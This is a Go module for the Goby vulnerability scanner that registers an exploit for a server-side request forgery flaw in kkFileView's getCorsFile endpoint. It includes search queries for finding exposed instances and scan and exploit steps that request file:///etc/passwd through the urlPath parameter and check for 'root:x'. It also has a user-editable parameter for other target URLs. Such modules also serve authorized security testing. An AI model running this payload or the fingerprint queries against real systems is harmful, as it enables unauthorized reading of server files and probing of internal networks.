package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "kkFileView getCorsFile Api urlPath Params SSRF vulnerability",
    "Description": "<p>kkFileView This project is an online preview project solution for files and documents. The paid products in the industry include [Yongzhong office] [office365] [idocv], etc. After obtaining the approval of the company's top management, it will be open sourced under the Apache protocol to feed the community. Special thanks @ The support of Mr. Tang and the contribution of @ Duanmu Xiangxiao. The project uses the popular spring boot to build, easy to use and deploy, and basically supports online preview of mainstream office documents, such as doc, docx, Excel, pdf, txt, zip, rar, pictures, etc.</p><p>This vulnerability appears in: file-online-preview\\jodconverter-web\\src\\main\\java\\cn\\keking\\web\\controller\\OnlinePreviewController.java</p><p>When previewing files across domains, the urlPath parameter is user-controllable. By modifying this parameter, SSRF vulnerabilities can be triggered and server intranet information can be detected.</p>",
    "Impact": "<p>This vulnerability appears in: file-online-preview\\jodconverter-web\\src\\main\\java\\cn\\keking\\web\\controller\\OnlinePreviewController.java</p><p>When previewing files across domains, the urlPath parameter is user-controllable. By modifying this parameter, SSRF vulnerabilities can be triggered and server intranet information can be detected.</p>",
    "Recommendation": "<p>1. Update to the latest version.</p><p>2. Set permissions for cross-domain preview files.</p>",
    "Product": "kkFileView",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "kkFileView getCorsFile 接口 urlPath 参数服务端请求伪造漏洞",
            "Product": "kkFileView",
            "Description": "<p><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">kkFileView&nbsp; 此项目为文件文档在线预览项目解决方案，对标业内付费产品有【</span><a href=\"http://dcs.yozosoft.com/\">永中office</a><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">】【</span><a href=\"http://www.officeweb365.com/\">office365</a><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">】【</span><a href=\"https://www.idocv.com/\">idocv</a><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">】等，在取得公司高层同意后以Apache协议开源出来反哺社区，在此特别感谢@唐老大的支持以及@端木详笑的贡献。该项目使用流行的spring boot搭建，易上手和部署，基本支持主流办公文档的在线预览，如doc,docx,Excel,pdf,txt,zip,rar,图片等等。</span></p><p><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">本次漏洞出现于：<span style=\"color: rgb(36, 41, 47); font-size: 14px;\">file-online-preview\\jodconverter-web\\src\\main\\java\\cn\\keking\\web\\controller\\OnlinePreviewController.java</span></span></p><p><span style=\"color: rgb(36, 41, 47); font-size: 16px;\"><span style=\"color: rgb(36, 41, 47); font-size: 14px;\"><span style=\"color: rgb(36, 41, 47); font-size: 14px;\">当通过跨域预览文件的时候，urlPath参数是用户可控的，通过修改此参数，可触发SSRF漏洞，探测服务器内网信息。</span><br></span></span></p>",
            "Recommendation": "<p>1、更新至最新版本。</p><p>2、跨域预览文件设置权限。</p>",
            "Impact": "<p><span style=\"color: rgb(36, 41, 47); font-size: 14px;\">当通过跨域预览文件的时候，urlPath参数是用户可控的，通过修改此参数，可触发SSRF漏洞，探测服务器内网信息（<span style=\"color: rgb(36, 41, 47); font-size: 14px;\">支持file协议的，任意文件读取</span>）。</span><br></p>",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "kkFileView getCorsFile Api urlPath Params SSRF vulnerability",
            "Product": "kkFileView",
            "Description": "<p>kkFileView This project is an online preview project solution for files and documents. The paid products in the industry include [Yongzhong office] [office365] [idocv], etc. After obtaining the approval of the company's top management, it will be open sourced under the Apache protocol to feed the community. Special thanks @ The support of Mr. Tang and the contribution of @ Duanmu Xiangxiao. The project uses the popular spring boot to build, easy to use and deploy, and basically supports online preview of mainstream office documents, such as doc, docx, Excel, pdf, txt, zip, rar, pictures, etc.</p><p>This vulnerability appears in: file-online-preview\\jodconverter-web\\src\\main\\java\\cn\\keking\\web\\controller\\OnlinePreviewController.java</p><p>When previewing files across domains, the urlPath parameter is user-controllable. By modifying this parameter, SSRF vulnerabilities can be triggered and server intranet information can be detected.</p>",
            "Recommendation": "<p>1. Update to the latest version.</p><p>2. Set permissions for cross-domain preview files.</p>",
            "Impact": "<p>This vulnerability appears in: file-online-preview\\jodconverter-web\\src\\main\\java\\cn\\keking\\web\\controller\\OnlinePreviewController.java</p><p>When previewing files across domains, the urlPath parameter is user-controllable. By modifying this parameter, SSRF vulnerabilities can be triggered and server intranet information can be detected.</p>",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "body=\"kkfileview.keking.cn\"&&body=\"onlinePreview?url=\"",
    "GobyQuery": "body=\"kkfileview.keking.cn\"&&body=\"onlinePreview?url=\"",
    "Author": "桂花松糕",
    "Homepage": "https://github.com/kekingcn/kkFileView",
    "DisclosureDate": "2020-06-14",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/getCorsFile?urlPath=file:///etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/getCorsFile?urlPath=file:///etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ssrf_cmd",
            "type": "input",
            "value": "file:///etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6876"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
